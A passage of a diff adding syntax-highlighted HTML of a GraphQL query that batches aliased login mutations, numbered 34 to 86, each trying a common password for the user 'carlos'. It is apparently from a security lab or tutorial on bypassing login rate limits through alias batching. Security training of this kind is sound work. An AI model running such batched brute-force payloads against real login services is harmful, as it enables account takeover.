+    </span><span class="err">success</span><span class="w">
+  </span><span class="p">}</span><span class="w">
+  </span><span class="err">bruteforce</span><span class="mi">34</span><span class="err">:</span><span class="w"> </span><span class="err">login(input:</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="err">password:</span><span class="w"> </span><span class="s2">"jordan"</span><span class="p">,</span><span class="w"> </span><span class="err">username:</span><span class="w"> </span><span class="s2">"carlos"</span><span class="w"> </span><span class="p">}</span><span class="err">)</span><span class="w"> </span><span class="p">{</span><span class="w">
+    </span><span class="err">token</span><span class="w">
+    </span><span class="err">success</span><span class="w">
+  </span><span class="p">}</span><span class="w">
+  </span><span class="err">bruteforce</span><span class="mi">35</span><span class="err">:</span><span class="w"> </span><span class="err">login(input:</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="err">password:</span><span class="w"> </span><span class="s2">"jennifer"</span><span class="p">,</span><span class="w"> </span><span class="err">username:</span><span class="w"> </span><span class="s2">"carlos"</span><span class="w"> </span><span class="p">}</span><span class="err">)</span><span class="w"> </span><span class="p">{</span><span class="w">
+    </span><span class="err">token</span><span class="w">
+    </span><span class="err">success</span><span class="w">
+  </span><span class="p">}</span><span class="w">
+  </span><span class="err">bruteforce</span><span class="mi">36</span><span class="err">:</span><span class="w"> </span><span class="err">login(input:</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="err">password:</span><span class="w"> </span><span class="s2">"zxcvbnm"</span><span class="p">,</span><span class="w"> </span><span class="err">username:</span><span class="w"> </span><span class="s2">"carlos"</span><span class="w"> </span><span class="p">}</span><span class="err">)</span><span class="w"> </span><span class="p">{</span><span class="w">
+    </span><span class="err">token</span><span class="w">
+    </span><span class="err">success</span><span class="w">
+  </span><span class="p">}</span><span class="w">
+  </span><span class="err">bruteforce</span><span class="mi">37</span><span class="err">:</span><span class="w"> </span><span class="err">login(input:</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="err">password:</span><span class="w"> </span><span class="s2">"asdfgh"</span><span class="p">,</span><span class="w"> </span><span class="err">username:</span><span class="w"> </span><span class="s2">"carlos"</span><span class="w"> </span><span class="p">}</span><span class="err">)</span><span class="w"> </span><span class="p">{</span><span class="w">
+    </span><span class="err">token</span><span class="w">
+    </span><span class="err">success</span><span class="w">
+  </span><span class="p">}</span><span class="w">
+  </span><span class="err">bruteforce</span><span class="mi">38</span><span class="err">:</span><span class="w"> </span><span class="err">login(input:</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="err">password:</span><span class="w"> </span><span class="s2">"hunter"</span><span class="p">,</span><span class="w"> </span><span class="err">username:</span><span class="w"> </span><span class="s2">"carlos"</span><span class="w"> </span><span class="p">}</span><span class="err">)</span><span class="w"> </span><span class="p">{</span><span class="w">
+    </span><span class="err">token</span><span class="w">
+    </span><span class="err">success</span><span class="w">
+  </span><span class="p">}</span><span class="w">
+  </span><span class="err">bruteforce</span><span class="mi">39</span><span class="err">:</span><span class="w"> </span><span class="err">login(input:</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="err">password:</span><span class="w"> </span><span class="s2">"buster"</span><span class="p">,</span><span class="w"> </span><span class="err">username:</span><span class="w"> </span><span class="s2">"carlos"</span><span class="w"> </span><span class="p">}</span><span class="err">)</span><span class="w"> </span><span class="p">{</span><span class="w">
+    </span><span class="err">token</span><span class="w">
+    </span><span class="err">success</span><span class="w">
+  </span><span class="p">}</span><span class="w">
+  </span><span class="err">bruteforce</span><span class="mi">40</span><span class="err">:</span><span class="w"> </span><span class="err">login(input:</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="err">password:</span><span class="w"> </span><span class="s2">"soccer"</span><span class="p">,</span><span class="w"> </span><span class="err">username:</span><span class="w"> </span><span class="s2">"carlos"</span><span class="w"> </span><span class="p">}</span><span class="err">)</span><span class="w"> </span><span class="p">{</span><span class="w">
+    </span><span class="err">token</span><span class="w">
+    </span><span class="err">success</span><span class="w">
+  </span><span class="p">}</span><span class="w">
+  </span><span class="err">bruteforce</span><span class="mi">41</span><span class="err">:</span><span class="w"> </span><span class="err">login(input:</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="err">password:</span><span class="w"> </span><span class="s2">"harley"</span><span class="p">,</span><span class="w"> </span><span class="err">username:</span><span class="w"> </span><span class="s2">"carlos"</span><span class="w"> </span><span class="p">}</span><span class="err">)</span><span class="w"> </span><span class="p">{</span><span class="w">
+    </span><span class="err">token</span><span class="w">
+    </span><span class="err">success</span><span class="w">
+  </span><span class="p">}</span><span class="w">
+  </span><span class="err">bruteforce</span><span class="mi">42</span><span class="err">:</span><span class="w"> </span><span class="err">login(input:</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="err">password:</span><span class="w"> </span><span class="s2">"batman"</span><span class="p">,</span><span class="w"> </span><span class="err">username:</span><span class="w"> </span><span class="s2">"carlos"</span><span class="w"> </span><span class="p">}</span><span class="err">)</span><span class="w"> </span><span class="p">{</span><span class="w">
+    </span><span class="err">token</span><span class="w">
+    </span><span class="err">success</span><span class="w">
+  </span><span class="p">}</span><span class="w">
+  </span><span class="err">bruteforce</span><span class="mi">43</span><span class="err">:</span><span class="w"> </span><span class="err">login(input:</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="err">password:</span><span class="w"> </span><span class="s2">"andrew"</span><span class="p">,</span><span class="w"> </span><span class="err">username:</span><span class="w"> </span><span class="s2">"carlos"</span><span class="w"> </span><span class="p">}</span><span class="err">)</span><span class="w"> </span><span class="p">{</span><span class="w">
+    </span><span class="err">token</span><span class="w">
+    </span><span class="err">success</span><span class="w">
+  </span><span class="p">}</span><span class="w">
+  </span><span class="err">bruteforce</span><span class="mi">44</span><span class="err">:</span><span class="w"> </span><span class="err">login(input:</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="err">password:</span><span class="w"> </span><span class="s2">"tigger"</span><span class="p">,</span><span class="w"> </span><span class="err">username:</span><span class="w"> </span><span class="s2">"carlos"</span><span class="w"> </span><span class="p">}</span><span class="err">)</span><span class="w"> </span><span class="p">{</span><span class="w">
+    </span><span class="err">token</span><span class="w">
+    </span><span class="err">success</span><span class="w">
+  </span><span class="p">}</span><span class="w">
+  </span><span class="err">bruteforce</span><span class="mi">45</span><span class="err">:</span><span class="w"> </span><span class="err">login(input:</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="err">password:</span><span class="w"> </span><span class="s2">"sunshine"</span><span class="p">,</span><span class="w"> </span><span class="err">username:</span><span class="w"> </span><span class="s2">"carlos"</span><span class="w"> </span><span class="p">}</span><span class="err">)</span><span class="w"> </span><span class="p">{</span><span class="w">
+    </span><span class="err">token</span><span class="w">
+    </span><span class="err">success</span><span class="w">
+  </span><span class="p">}</span><span class="w">
+  </span><span class="err">bruteforce</span><span class="mi">46</span><span class="err">:</span><span class="w"> </span><span class="err">login(input:</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="err">password:</span><span class="w"> </span><span class="s2">"iloveyou"</span><span class="p">,</span><span class="w"> </span><span class="err">username:</span><span class="w"> </span><span class="s2">"carlos"</span><span class="w"> </span><span class="p">}</span><span class="err">)</span><span class="w"> </span><span class="p">{</span><span class="w">
+    </span><span class="err">token</span><span class="w">
+    </span><span class="err">success</span><span class="w">
+  </span><span class="p">}</span><span class="w">
+  </span><span class="err">bruteforce</span><span class="mi">47</span><span class="err">:</span><span class="w"> </span><span class="err">login(input:</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="err">password:</span><span class="w"> </span><span class="s2">"2000"</span><span class="p">,</span><span class="w"> </span><span class="err">username:</span><span class="w"> </span><span class="s2">"carlos"</span><span class="w"> </span><span class="p">}</span><span class="err">)</span><span class="w"> </span><span class="p">{</span><span class="w">
+    </span><span class="err">token</span><span class="w">
+    </span><span class="err">success</span><span class="w">
+  </span><span class="p">}</span><span class="w">
+  </span><span class="err">bruteforce</span><span class="mi">48</span><span class="err">:</span><span class="w"> </span><span class="err">login(input:</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="err">password:</span><span class="w"> </span><span class="s2">"charlie"</span><span class="p">,</span><span class="w"> </span><span class="err">username:</span><span class="w"> </span><span class="s2">"carlos"</span><span class="w"> </span><span class="p">}</span><span class="err">)</span><span class="w"> </span><span class="p">{</span><span class="w">
+    </span><span class="err">token</span><span class="w">
+    </span><span class="err">success</span><span class="w">
+  </span><span class="p">}</span><span class="w">
+  </span><span class="err">bruteforce</span><span class="mi">49</span><span class="err">:</span><span class="w"> </span><span class="err">login(input:</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="err">password:</span><span class="w"> </span><span class="s2">"robert"</span><span class="p">,</span><span class="w"> </span><span class="err">username:</span><span class="w"> </span><span class="s2">"carlos"</span><span class="w"> </span><span class="p">}</span><span class="err">)</span><span class="w"> </span><span class="p">{</span><span class="w">
+    </span><span class="err">token</span><span class="w">
+    </span><span class="err">success</span><span class="w">
+  </span><span class="p">}</span><span class="w">
+  </span><span class="err">bruteforce</span><span class="mi">50</span><span class="err">:</span><span class="w"> </span><span class="err">login(input:</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="err">password:</span><span class="w"> </span><span class="s2">"thomas"</span><span class="p">,</span><span class="w"> </span><span class="err">username:</span><span class="w"> </span><span class="s2">"carlos"</span><span class="w"> </span><span class="p">}</span><span class="err">)</span><span class="w"> </span><span class="p">{</span><span class="w">
+    </span><span class="err">token</span><span class="w">
+    </span><span class="err">success</span><span class="w">
+  </span><span class="p">}</span><span class="w">
+  </span><span class="err">bruteforce</span><span class="mi">51</span><span class="err">:</span><span class="w"> </span><span class="err">login(input:</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="err">password:</span><span class="w"> </span><span class="s2">"hockey"</span><span class="p">,</span><span class="w"> </span><span class="err">username:</span><span class="w"> </span><span class="s2">"carlos"</span><span class="w"> </span><span class="p">}</span><span class="err">)</span><span class="w"> </span><span class="p">{</span><span class="w">
+    </span><span class="err">token</span><span class="w">
+    </span><span class="err">success</span><span class="w">
+  </span><span class="p">}</span><span class="w">
+  </span><span class="err">bruteforce</span><span class="mi">52</span><span class="err">:</span><span class="w"> </span><span class="err">login(input:</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="err">password:</span><span class="w"> </span><span class="s2">"ranger"</span><span class="p">,</span><span class="w"> </span><span class="err">username:</span><span class="w"> </span><span class="s2">"carlos"</span><span class="w"> </span><span class="p">}</span><span class="err">)</span><span class="w"> </span><span class="p">{</span><span class="w">
+    </span><span class="err">token</span><span class="w">
+    </span><span class="err">success</span><span class="w">
+  </span><span class="p">}</span><span class="w">
+  </span><span class="err">bruteforce</span><span class="mi">53</span><span class="err">:</span><span class="w"> </span><span class="err">login(input:</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="err">password:</span><span class="w"> </span><span class="s2">"daniel"</span><span class="p">,</span><span class="w"> </span><span class="err">username:</span><span class="w"> </span><span class="s2">"carlos"</span><span class="w"> </span><span class="p">}</span><span class="err">)</span><span class="w"> </span><span class="p">{</span><span class="w">
+    </span><span class="err">token</span><span class="w">
+    </span><span class="err">success</span><span class="w">
+  </span><span class="p">}</span><span class="w">
+  </span><span class="err">bruteforce</span><span class="mi">54</span><span class="err">:</span><span class="w"> </span><span class="err">login(input:</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="err">password:</span><span class="w"> </span><span class="s2">"starwars"</span><span class="p">,</span><span class="w"> </span><span class="err">username:</span><span class="w"> </span><span class="s2">"carlos"</span><span class="w"> </span><span class="p">}</span><span class="err">)</span><span class="w"> </span><span class="p">{</span><span class="w">
+    </span><span class="err">token</span><span class="w">
+    </span><span class="err">success</span><span class="w">
+  </span><span class="p">}</span><span class="w">
+  </span><span class="err">bruteforce</span><span class="mi">55</span><span class="err">:</span><span class="w"> </span><span class="err">login(input:</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="err">password:</span><span class="w"> </span><span class="s2">"klaster"</span><span class="p">,</span><span class="w"> </span><span class="err">username:</span><span class="w"> </span><span class="s2">"carlos"</span><span class="w"> </span><span class="p">}</span><span class="err">)</span><span class="w"> </span><span class="p">{</span><span class="w">
+    </span><span class="err">token</span><span class="w">
+    </span><span class="err">success</span><span class="w">
+  </span><span class="p">}</span><span class="w">
+  </span><span class="err">bruteforce</span><span class="mi">56</span><span class="err">:</span><span class="w"> </span><span class="err">login(input:</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="err">password:</span><span class="w"> </span><span class="s2">"112233"</span><span class="p">,</span><span class="w"> </span><span class="err">username:</span><span class="w"> </span><span class="s2">"carlos"</span><span class="w"> </span><span class="p">}</span><span class="err">)</span><span class="w"> </span><span class="p">{</span><span class="w">
+    </span><span class="err">token</span><span class="w">
+    </span><span class="err">success</span><span class="w">
+  </span><span class="p">}</span><span class="w">
+  </span><span class="err">bruteforce</span><span class="mi">57</span><span class="err">:</span><span class="w"> </span><span class="err">login(input:</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="err">password:</span><span class="w"> </span><span class="s2">"george"</span><span class="p">,</span><span class="w"> </span><span class="err">username:</span><span class="w"> </span><span class="s2">"carlos"</span><span class="w"> </span><span class="p">}</span><span class="err">)</span><span class="w"> </span><span class="p">{</span><span class="w">
+    </span><span class="err">token</span><span class="w">
+    </span><span class="err">success</span><span class="w">
+  </span><span class="p">}</span><span class="w">
+  </span><span class="err">bruteforce</span><span class="mi">58</span><span class="err">:</span><span class="w"> </span><span class="err">login(input:</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="err">password:</span><span class="w"> </span><span class="s2">"computer"</span><span class="p">,</span><span class="w"> </span><span class="err">username:</span><span class="w"> </span><span class="s2">"carlos"</span><span class="w"> </span><span class="p">}</span><span class="err">)</span><span class="w"> </span><span class="p">{</span><span class="w">
+    </span><span class="err">token</span><span class="w">
+    </span><span class="err">success</span><span class="w">
+  </span><span class="p">}</span><span class="w">
+  </span><span class="err">bruteforce</span><span class="mi">59</span><span class="err">:</span><span class="w"> </span><span class="err">login(input:</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="err">password:</span><span class="w"> </span><span class="s2">"michelle"</span><span class="p">,</span><span class="w"> </span><span class="err">username:</span><span class="w"> </span><span class="s2">"carlos"</span><span class="w"> </span><span class="p">}</span><span class="err">)</span><span class="w"> </span><span class="p">{</span><span class="w">
+    </span><span class="err">token</span><span class="w">
+    </span><span class="err">success</span><span class="w">
+  </span><span class="p">}</span><span class="w">
+  </span><span class="err">bruteforce</span><span class="mi">60</span><span class="err">:</span><span class="w"> </span><span class="err">login(input:</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="err">password:</span><span class="w"> </span><span class="s2">"jessica"</span><span class="p">,</span><span class="w"> </span><span class="err">username:</span><span class="w"> </span><span class="s2">"carlos"</span><span class="w"> </span><span class="p">}</span><span class="err">)</span><span class="w"> </span><span class="p">{</span><span class="w">
+    </span><span class="err">token</span><span class="w">
+    </span><span class="err">success</span><span class="w">
+  </span><span class="p">}</span><span class="w">
+  </span><span class="err">bruteforce</span><span class="mi">61</span><span class="err">:</span><span class="w"> </span><span class="err">login(input:</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="err">password:</span><span class="w"> </span><span class="s2">"pepper"</span><span class="p">,</span><span class="w"> </span><span class="err">username:</span><span class="w"> </span><span class="s2">"carlos"</span><span class="w"> </span><span class="p">}</span><span class="err">)</span><span class="w"> </span><span class="p">{</span><span class="w">
+    </span><span class="err">token</span><span class="w">
+    </span><span class="err">success</span><span class="w">
+  </span><span class="p">}</span><span class="w">
+  </span><span class="err">bruteforce</span><span class="mi">62</span><span class="err">:</span><span class="w"> </span><span class="err">login(input:</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="err">password:</span><span class="w"> </span><span class="s2">"1111"</span><span class="p">,</span><span class="w"> </span><span class="err">username:</span><span class="w"> </span><span class="s2">"carlos"</span><span class="w"> </span><span class="p">}</span><span class="err">)</span><span class="w"> </span><span class="p">{</span><span class="w">
+    </span><span class="err">token</span><span class="w">
+    </span><span class="err">success</span><span class="w">
+  </span><span class="p">}</span><span class="w">
+  </span><span class="err">bruteforce</span><span class="mi">63</span><span class="err">:</span><span class="w"> </span><span class="err">login(input:</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="err">password:</span><span class="w"> </span><span class="s2">"zxcvbn"</span><span class="p">,</span><span class="w"> </span><span class="err">username:</span><span class="w"> </span><span class="s2">"carlos"</span><span class="w"> </span><span class="p">}</span><span class="err">)</span><span class="w"> </span><span class="p">{</span><span class="w">
+    </span><span class="err">token</span><span class="w">
+    </span><span class="err">success</span><span class="w">
+  </span><span class="p">}</span><span class="w">
+  </span><span class="err">bruteforce</span><span class="mi">64</span><span class="err">:</span><span class="w"> </span><span class="err">login(input:</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="err">password:</span><span class="w"> </span><span class="s2">"555555"</span><span class="p">,</span><span class="w"> </span><span class="err">username:</span><span class="w"> </span><span class="s2">"carlos"</span><span class="w"> </span><span class="p">}</span><span class="err">)</span><span class="w"> </span><span class="p">{</span><span class="w">
+    </span><span class="err">token</span><span class="w">
+    </span><span class="err">success</span><span class="w">
+  </span><span class="p">}</span><span class="w">
+  </span><span class="err">bruteforce</span><span class="mi">65</span><span class="err">:</span><span class="w"> </span><span class="err">login(input:</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="err">password:</span><span class="w"> </span><span class="s2">"11111111"</span><span class="p">,</span><span class="w"> </span><span class="err">username:</span><span class="w"> </span><span class="s2">"carlos"</span><span class="w"> </span><span class="p">}</span><span class="err">)</span><span class="w"> </span><span class="p">{</span><span class="w">
+    </span><span class="err">token</span><span class="w">
+    </span><span class="err">success</span><span class="w">
+  </span><span class="p">}</span><span class="w">
+  </span><span class="err">bruteforce</span><span class="mi">66</span><span class="err">:</span><span class="w"> </span><span class="err">login(input:</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="err">password:</span><span class="w"> </span><span class="s2">"131313"</span><span class="p">,</span><span class="w"> </span><span class="err">username:</span><span class="w"> </span><span class="s2">"carlos"</span><span class="w"> </span><span class="p">}</span><span class="err">)</span><span class="w"> </span><span class="p">{</span><span class="w">
+    </span><span class="err">token</span><span class="w">
+    </span><span class="err">success</span><span class="w">
+  </span><span class="p">}</span><span class="w">
+  </span><span class="err">bruteforce</span><span class="mi">67</span><span class="err">:</span><span class="w"> </span><span class="err">login(input:</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="err">password:</span><span class="w"> </span><span class="s2">"freedom"</span><span class="p">,</span><span class="w"> </span><span class="err">username:</span><span class="w"> </span><span class="s2">"carlos"</span><span class="w"> </span><span class="p">}</span><span class="err">)</span><span class="w"> </span><span class="p">{</span><span class="w">
+    </span><span class="err">token</span><span class="w">
+    </span><span class="err">success</span><span class="w">
+  </span><span class="p">}</span><span class="w">
+  </span><span class="err">bruteforce</span><span class="mi">68</span><span class="err">:</span><span class="w"> </span><span class="err">login(input:</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="err">password:</span><span class="w"> </span><span class="s2">"777777"</span><span class="p">,</span><span class="w"> </span><span class="err">username:</span><span class="w"> </span><span class="s2">"carlos"</span><span class="w"> </span><span class="p">}</span><span class="err">)</span><span class="w"> </span><span class="p">{</span><span class="w">
+    </span><span class="err">token</span><span class="w">
+    </span><span class="err">success</span><span class="w">
+  </span><span class="p">}</span><span class="w">
+  </span><span class="err">bruteforce</span><span class="mi">69</span><span class="err">:</span><span class="w"> </span><span class="err">login(input:</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="err">password:</span><span class="w"> </span><span class="s2">"pass"</span><span class="p">,</span><span class="w"> </span><span class="err">username:</span><span class="w"> </span><span class="s2">"carlos"</span><span class="w"> </span><span class="p">}</span><span class="err">)</span><span class="w"> </span><span class="p">{</span><span class="w">
+    </span><span class="err">token</span><span class="w">
+    </span><span class="err">success</span><span class="w">
+  </span><span class="p">}</span><span class="w">
+  </span><span class="err">bruteforce</span><span class="mi">70</span><span class="err">:</span><span class="w"> </span><span class="err">login(input:</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="err">password:</span><span class="w"> </span><span class="s2">"maggie"</span><span class="p">,</span><span class="w"> </span><span class="err">username:</span><span class="w"> </span><span class="s2">"carlos"</span><span class="w"> </span><span class="p">}</span><span class="err">)</span><span class="w"> </span><span class="p">{</span><span class="w">
+    </span><span class="err">token</span><span class="w">
+    </span><span class="err">success</span><span class="w">
+  </span><span class="p">}</span><span class="w">
+  </span><span class="err">bruteforce</span><span class="mi">71</span><span class="err">:</span><span class="w"> </span><span class="err">login(input:</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="err">password:</span><span class="w"> </span><span class="s2">"159753"</span><span class="p">,</span><span class="w"> </span><span class="err">username:</span><span class="w"> </span><span class="s2">"carlos"</span><span class="w"> </span><span class="p">}</span><span class="err">)</span><span class="w"> </span><span class="p">{</span><span class="w">
+    </span><span class="err">token</span><span class="w">
+    </span><span class="err">success</span><span class="w">
+  </span><span class="p">}</span><span class="w">
+  </span><span class="err">bruteforce</span><span class="mi">72</span><span class="err">:</span><span class="w"> </span><span class="err">login(input:</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="err">password:</span><span class="w"> </span><span class="s2">"aaaaaa"</span><span class="p">,</span><span class="w"> </span><span class="err">username:</span><span class="w"> </span><span class="s2">"carlos"</span><span class="w"> </span><span class="p">}</span><span class="err">)</span><span class="w"> </span><span class="p">{</span><span class="w">
+    </span><span class="err">token</span><span class="w">
+    </span><span class="err">success</span><span class="w">
+  </span><span class="p">}</span><span class="w">
+  </span><span class="err">bruteforce</span><span class="mi">73</span><span class="err">:</span><span class="w"> </span><span class="err">login(input:</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="err">password:</span><span class="w"> </span><span class="s2">"ginger"</span><span class="p">,</span><span class="w"> </span><span class="err">username:</span><span class="w"> </span><span class="s2">"carlos"</span><span class="w"> </span><span class="p">}</span><span class="err">)</span><span class="w"> </span><span class="p">{</span><span class="w">
+    </span><span class="err">token</span><span class="w">
+    </span><span class="err">success</span><span class="w">
+  </span><span class="p">}</span><span class="w">
+  </span><span class="err">bruteforce</span><span class="mi">74</span><span class="err">:</span><span class="w"> </span><span class="err">login(input:</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="err">password:</span><span class="w"> </span><span class="s2">"princess"</span><span class="p">,</span><span class="w"> </span><span class="err">username:</span><span class="w"> </span><span class="s2">"carlos"</span><span class="w"> </span><span class="p">}</span><span class="err">)</span><span class="w"> </span><span class="p">{</span><span class="w">
+    </span><span class="err">token</span><span class="w">
+    </span><span class="err">success</span><span class="w">
+  </span><span class="p">}</span><span class="w">
+  </span><span class="err">bruteforce</span><span class="mi">75</span><span class="err">:</span><span class="w"> </span><span class="err">login(input:</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="err">password:</span><span class="w"> </span><span class="s2">"joshua"</span><span class="p">,</span><span class="w"> </span><span class="err">username:</span><span class="w"> </span><span class="s2">"carlos"</span><span class="w"> </span><span class="p">}</span><span class="err">)</span><span class="w"> </span><span class="p">{</span><span class="w">
+    </span><span class="err">token</span><span class="w">
+    </span><span class="err">success</span><span class="w">
+  </span><span class="p">}</span><span class="w">
+  </span><span class="err">bruteforce</span><span class="mi">76</span><span class="err">:</span><span class="w"> </span><span class="err">login(input:</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="err">password:</span><span class="w"> </span><span class="s2">"cheese"</span><span class="p">,</span><span class="w"> </span><span class="err">username:</span><span class="w"> </span><span class="s2">"carlos"</span><span class="w"> </span><span class="p">}</span><span class="err">)</span><span class="w"> </span><span class="p">{</span><span class="w">
+    </span><span class="err">token</span><span class="w">
+    </span><span class="err">success</span><span class="w">
+  </span><span class="p">}</span><span class="w">
+  </span><span class="err">bruteforce</span><span class="mi">77</span><span class="err">:</span><span class="w"> </span><span class="err">login(input:</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="err">password:</span><span class="w"> </span><span class="s2">"amanda"</span><span class="p">,</span><span class="w"> </span><span class="err">username:</span><span class="w"> </span><span class="s2">"carlos"</span><span class="w"> </span><span class="p">}</span><span class="err">)</span><span class="w"> </span><span class="p">{</span><span class="w">
+    </span><span class="err">token</span><span class="w">
+    </span><span class="err">success</span><span class="w">
+  </span><span class="p">}</span><span class="w">
+  </span><span class="err">bruteforce</span><span class="mi">78</span><span class="err">:</span><span class="w"> </span><span class="err">login(input:</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="err">password:</span><span class="w"> </span><span class="s2">"summer"</span><span class="p">,</span><span class="w"> </span><span class="err">username:</span><span class="w"> </span><span class="s2">"carlos"</span><span class="w"> </span><span class="p">}</span><span class="err">)</span><span class="w"> </span><span class="p">{</span><span class="w">
+    </span><span class="err">token</span><span class="w">
+    </span><span class="err">success</span><span class="w">
+  </span><span class="p">}</span><span class="w">
+  </span><span class="err">bruteforce</span><span class="mi">79</span><span class="err">:</span><span class="w"> </span><span class="err">login(input:</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="err">password:</span><span class="w"> </span><span class="s2">"love"</span><span class="p">,</span><span class="w"> </span><span class="err">username:</span><span class="w"> </span><span class="s2">"carlos"</span><span class="w"> </span><span class="p">}</span><span class="err">)</span><span class="w"> </span><span class="p">{</span><span class="w">
+    </span><span class="err">token</span><span class="w">
+    </span><span class="err">success</span><span class="w">
+  </span><span class="p">}</span><span class="w">
+  </span><span class="err">bruteforce</span><span class="mi">80</span><span class="err">:</span><span class="w"> </span><span class="err">login(input:</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="err">password:</span><span class="w"> </span><span class="s2">"ashley"</span><span class="p">,</span><span class="w"> </span><span class="err">username:</span><span class="w"> </span><span class="s2">"carlos"</span><span class="w"> </span><span class="p">}</span><span class="err">)</span><span class="w"> </span><span class="p">{</span><span class="w">
+    </span><span class="err">token</span><span class="w">
+    </span><span class="err">success</span><span class="w">
+  </span><span class="p">}</span><span class="w">
+  </span><span class="err">bruteforce</span><span class="mi">81</span><span class="err">:</span><span class="w"> </span><span class="err">login(input:</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="err">password:</span><span class="w"> </span><span class="s2">"nicole"</span><span class="p">,</span><span class="w"> </span><span class="err">username:</span><span class="w"> </span><span class="s2">"carlos"</span><span class="w"> </span><span class="p">}</span><span class="err">)</span><span class="w"> </span><span class="p">{</span><span class="w">
+    </span><span class="err">token</span><span class="w">
+    </span><span class="err">success</span><span class="w">
+  </span><span class="p">}</span><span class="w">
+  </span><span class="err">bruteforce</span><span class="mi">82</span><span class="err">:</span><span class="w"> </span><span class="err">login(input:</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="err">password:</span><span class="w"> </span><span class="s2">"chelsea"</span><span class="p">,</span><span class="w"> </span><span class="err">username:</span><span class="w"> </span><span class="s2">"carlos"</span><span class="w"> </span><span class="p">}</span><span class="err">)</span><span class="w"> </span><span class="p">{</span><span class="w">
+    </span><span class="err">token</span><span class="w">
+    </span><span class="err">success</span><span class="w">
+  </span><span class="p">}</span><span class="w">
+  </span><span class="err">bruteforce</span><span class="mi">83</span><span class="err">:</span><span class="w"> </span><span class="err">login(input:</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="err">password:</span><span class="w"> </span><span class="s2">"biteme"</span><span class="p">,</span><span class="w"> </span><span class="err">username:</span><span class="w"> </span><span class="s2">"carlos"</span><span class="w"> </span><span class="p">}</span><span class="err">)</span><span class="w"> </span><span class="p">{</span><span class="w">
+    </span><span class="err">token</span><span class="w">
+    </span><span class="err">success</span><span class="w">
+  </span><span class="p">}</span><span class="w">
+  </span><span class="err">bruteforce</span><span class="mi">84</span><span class="err">:</span><span class="w"> </span><span class="err">login(input:</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="err">password:</span><span class="w"> </span><span class="s2">"matthew"</span><span class="p">,</span><span class="w"> </span><span class="err">username:</span><span class="w"> </span><span class="s2">"carlos"</span><span class="w"> </span><span class="p">}</span><span class="err">)</span><span class="w"> </span><span class="p">{</span><span class="w">
+    </span><span class="err">token</span><span class="w">
+    </span><span class="err">success</span><span class="w">
+  </span><span class="p">}</span><span class="w">
+  </span><span class="err">bruteforce</span><span class="mi">85</span><span class="err">:</span><span class="w"> </span><span class="err">login(input:</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="err">password:</span><span class="w"> </span><span class="s2">"access"</span><span class="p">,</span><span class="w"> </span><span class="err">username:</span><span class="w"> </span><span class="s2">"carlos"</span><span class="w"> </span><span class="p">}</span><span class="err">)</span><span class="w"> </span><span class="p">{</span><span class="w">
+    </span><span class="err">token</span><span class="w">
+    </span><span class="err">success</span><span class="w">
+  </span><span class="p">}</span><span class="w">
+  </span><span class="err">bruteforce</span><span class="mi">86</span><span class="err">:</span><span class="w"> </span><span class="err">login(input:</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="err">password:</span><span class="w"> </span><span class="s2">"yankees"</span><span class="p">,</span><span class="w"> </span><span class="err">username:</span><span class="w"> </span><span class="s2">"carlos"</span><span class="w"> </span><span class="p">}</span><span class="err">)</span><span class="w"> </span><span class="p">{</span><span class="w">
+    </span><span class="err">token</span><span class="w">
+    </span><span class="err">success</span><span class="w">
+  </span><span class="p">}</span><span class="w">
